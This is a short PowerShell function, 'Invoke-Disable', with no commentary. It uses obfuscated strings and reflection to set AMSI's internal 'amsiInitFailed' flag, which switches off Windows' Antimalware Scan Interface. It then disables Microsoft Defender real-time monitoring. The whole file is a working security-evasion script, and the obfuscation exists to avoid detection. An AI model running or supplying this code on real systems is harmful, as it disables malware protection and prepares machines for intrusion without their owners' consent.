function Invoke-Disable {
	[Ref].Assembly.GetType('System.Management.Automation.AmSVAtils'.Replace('SVA','siU')).GetField('amSVAnitFailed'.Replace('SVA','siI'),'NonPublic,Static').SetValue($null,$true)
	Set-Mppreference -DisableRealtimeMonitoring $true
}
